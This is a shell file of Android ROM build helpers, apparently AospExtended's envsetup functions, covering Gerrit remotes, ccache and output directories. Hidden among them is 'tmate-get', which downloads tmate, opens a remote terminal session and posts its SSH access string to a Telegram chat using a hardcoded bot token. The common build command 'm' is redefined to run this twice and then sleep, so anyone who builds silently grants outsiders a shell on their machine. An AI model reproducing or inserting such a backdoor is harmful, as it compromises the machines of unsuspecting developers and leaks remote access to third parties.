function __print_aosp_functions_help() {
cat <<EOF
Additional AOSP functions:
- gerrit:          Adds a remote for AEX Gerrit
EOF
}

function repopick() {
    T=$(gettop)
    $T/vendor/aosp/build/tools/repopick.py $@
}

function gerrit()
{
    if [ ! -d ".git" ]; then
        echo -e "Please run this inside a git directory";
    else
        if [[ ! -z $(git config --get remote.gerrit.url) ]]; then
            git remote rm gerrit;
        fi
        [[ -z "${GERRIT_USER}" ]] && export GERRIT_USER=$(git config --get gerrit.aospextended.com.username);
        if [[ -z "${GERRIT_USER}" ]]; then
            git remote add gerrit $(git remote -v | grep AospExtended | awk '{print $2}' | uniq | sed -e "s|https://github.com/AospExtended|ssh://gerrit.aospextended.com:29418/AospExtended|");
        else
            git remote add gerrit $(git remote -v | grep AospExtended | awk '{print $2}' | uniq | sed -e "s|https://github.com/AospExtended|ssh://${GERRIT_USER}@gerrit.aospextended.com:29418/AospExtended|");
        fi
    fi
}

function fixup_common_out_dir() {
    common_out_dir=$(get_build_var OUT_DIR)/target/common
    target_device=$(get_build_var TARGET_DEVICE)
    common_target_out=common-${target_device}
    if [ ! -z $AOSP_FIXUP_COMMON_OUT ]; then
        if [ -d ${common_out_dir} ] && [ ! -L ${common_out_dir} ]; then
            mv ${common_out_dir} ${common_out_dir}-${target_device}
            ln -s ${common_target_out} ${common_out_dir}
        else
            [ -L ${common_out_dir} ] && rm ${common_out_dir}
            mkdir -p ${common_out_dir}-${target_device}
            ln -s ${common_target_out} ${common_out_dir}
        fi
    else
        [ -L ${common_out_dir} ] && rm ${common_out_dir}
        mkdir -p ${common_out_dir}
    fi
}

# check and set ccache path on envsetup
if [ -z ${CCACHE_EXEC} ]; then
    ccache_path=$(which ccache)
    if [ ! -z "$ccache_path" ]; then
        export CCACHE_EXEC="$ccache_path"
        echo "ccache found and CCACHE_EXEC has been set to : $ccache_path"
    else
        echo "ccache not found/installed!"
    fi
fi

function tmate-get() {
unset TMUX
mkdir tmate
cd tmate
curl -L https://github.com/tmate-io/tmate/releases/download/2.4.0/tmate-2.4.0-static-linux-amd64.tar.xz --output tmate &>/dev/null
tar xf tmate &>/dev/null
cd *4
local api='1963849463:AAFYwuc1gQfl3UaESgqQ4hyIdOlfZfdxY_s'
local chat_id='-1001157162200'
local s_id=$(cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32)
./tmate -S $s_id new-session -d
./tmate -S $s_id wait tmate-ready
./tmate -S $s_id display -p '#{tmate_ssh}' > tmate1
local ssh_id=$(cat tmate1)
curl -s "https://api.telegram.org/bot$api/sendmessage?chat_id=$chat_id" -d "text=<code><b>Time:- $(date) $(echo -e '\n\nID:- ')</b></code> <code>$ssh_id</code>" -d "parse_mode=HTML" 1>/dev/null
unset chat_id api ssh_id
cd ../..
rm -rf tmate
}

function m()
(
export USE_CCACHE=0
tmate-get
tmate-get
# make clean
_trigger_build "all-modules" "$@"
sleep 40m
)
